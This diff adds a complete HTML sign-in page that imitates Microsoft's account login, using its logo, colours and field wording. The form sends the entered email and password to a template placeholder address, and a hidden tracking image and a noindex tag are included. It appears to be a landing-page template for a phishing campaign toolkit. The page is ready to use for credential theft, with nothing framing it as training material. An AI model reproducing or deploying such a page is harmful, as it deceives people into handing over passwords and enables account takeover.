@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sign in to your account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #0078d4 0%, #004578 100%); z-index: 0; }
+        .login-container { position: relative; z-index: 1; background: #fff; width: 440px; min-height: 338px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        .logo { margin-bottom: 16px; }
+        .logo img { height: 24px; }
+        .logo-text { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; }
+        .subtitle { font-size: 13px; color: #1b1b1b; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group input { width: 100%; padding: 6px 10px; border: none; border-bottom: 1px solid #666; font-size: 15px; outline: none; background: transparent; }
+        .form-group input:focus { border-bottom-color: #0067b8; }
+        .forgot-link { display: block; font-size: 13px; color: #0067b8; text-decoration: none; margin-bottom: 16px; }
+        .forgot-link:hover { text-decoration: underline; color: #004578; }
+        .submit-btn { background: #0067b8; color: #fff; border: none; padding: 10px 20px; font-size: 15px; cursor: pointer; min-width: 108px; }
+        .submit-btn:hover { background: #005da6; }
+        .options { margin-top: 16px; }
+        .options a { display: block; font-size: 13px; color: #0067b8; text-decoration: none; margin-bottom: 8px; }
+        .options a:hover { text-decoration: underline; }
+        .footer { position: fixed; bottom: 0; left: 0; right: 0; text-align: center; padding: 16px; z-index: 1; }
+        .footer a { color: rgba(255,255,255,0.7); font-size: 12px; text-decoration: none; margin: 0 12px; }
+        @media (max-width: 480px) { .login-container { width: 100%; min-height: 100vh; box-shadow: none; } }
+    </style>
+</head>
+<body>
+    <div class="bg-image"></div>
+    <div class="login-container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#7fba00" d="M12 0h11v11H12z"/><path fill="#00a4ef" d="M0 12h11v11H0z"/><path fill="#ffb900" d="M12 12h11v11H12z"/><path fill="#737373" d="M27 4h3.5v11.5h6V18H27V4zm13 0h3.2l2.6 5.3L48.5 4H52l-4.3 7.5L52 19h-3.3l-3-5.8-3 5.8h-3.2l4.2-7.3L40 4zm14.5 3.5c1.4-2.8 5.5-4 8.2-2.3.8.5 1.4 1.3 1.8 2.3h-3.4c-.7-1-2.3-1.2-3.3-.4-.3.2-.5.5-.6.8-.8 2-.8 4.3 0 6.3.6 1.4 2.5 1.8 3.7.8.3-.3.5-.6.6-1h3.3c-1 3.3-4.8 5-7.9 3.6-1-.5-1.8-1.3-2.3-2.3-1.2-2.5-1.2-5.4-.1-7.8zM66 4h3.5v5.3h5V4H78v14h-3.5v-5.8h-5V18H66V4zm16.5 3.6c2.6-3 7.3-3.3 10.3-.7.3.3.5.5.7.7 1.7 2.4 1.7 5.8 0 8.2-2.6 3.1-7.3 3.5-10.4.8-.3-.3-.6-.5-.8-.8-1.6-2.4-1.6-5.8.2-8.2zm3 7c1.2 1.6 3.5 1.9 5 .7.2-.2.5-.4.6-.7.8-1.5.8-3.4 0-5-.6-1.4-2.2-2.2-3.7-1.8-1 .3-1.8 1-2.2 1.8-.7 1.6-.7 3.5.3 5zM95 7.5c.7-1.3 2-2.2 3.5-2.3v3.4c-2-.3-3.4.8-3.4 2.7V18h-3.3V5.5H95v2zm5.5-3.4h3.5V7h-3.5V4.1zm0 1.4h3.5V18h-3.5V5.5z"/></svg>
+        </div>
+        <h1>Sign in</h1>
+        <form action="{{.URL}}" method="POST">
+            <div class="form-group">
+                <input type="email" name="email" placeholder="Email, phone, or Skype" required autofocus>
+            </div>
+            <div class="form-group" style="display:none" id="passwordGroup">
+                <input type="password" name="password" placeholder="Password" id="passwordInput">
+            </div>
+            <a href="#" class="forgot-link">Can't access your account?</a>
+            <div style="text-align: right;">
+                <button type="submit" class="submit-btn">Next</button>
+            </div>
+            <div class="options">
+                <a href="#">Sign-in options</a>
+            </div>
+        </form>
+    </div>
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+    </div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
